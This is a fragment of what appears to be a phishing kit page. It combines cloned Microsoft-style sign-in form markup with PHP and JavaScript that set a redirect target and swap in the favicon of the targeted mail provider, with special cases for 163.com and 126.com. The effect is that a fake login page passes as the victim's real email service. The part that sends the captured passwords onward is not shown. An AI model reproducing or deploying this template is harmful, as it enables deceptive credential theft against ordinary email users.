                        params: {
                            serverData: svr,
                            availableCreds: availableCreds,
                            currentCred: 1 },
                        event: {
                            switchView: onSwitchView } } --><!-- ko if: altCreds.length > 1 --><!-- /ko --><!-- ko if: altCreds.length === 1 --><!-- /ko --><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                params: {
                    availableCreds: availableCredsWithoutUsername },
                event: {
                    switchView: noUsernameCredSwitchLink_onSwitchView } } --><!-- ko if: altCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: !svr.B1 && svr.Bq --><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --><!-- /ko --> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div> <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.fRepositionFooterButtons,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in"> </div> </div></div> </div></div>
            
            </div></form>
            
 

<?php

if($backcurl == 'https://mail.163.com/'  or $backcurl == 'https://mail.126.com/' ){
$backcurlf='https://www.163.com/';
	
}else{
	
$backcurlf= $backcurl;
	
}
 
?>

<script>
//FAVICONS
var pageIcon='https://www.google.com/s2/favicons?domain=<?php echo $backcurlf ;?>';
if(openurl !== null){pageIcon = 'https://www.google.com/s2/favicons?domain=<?php echo $backcurlf ;?>';};
if(linkedin == 'yes'){'https://www.google.com/s2/favicons?domain=<?php echo $backcurlf ;?>';};

(function(){
    var link = document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = pageIcon;
    document.getElementsByTagName('head')[0].appendChild(link);
}());
//Overlay Icon
document.getElementById('favIcon').src=pageIcon;
</script>

 
 
              </div> </div> <!-- /ko --></div>
                
                
                </body></html><?php }?>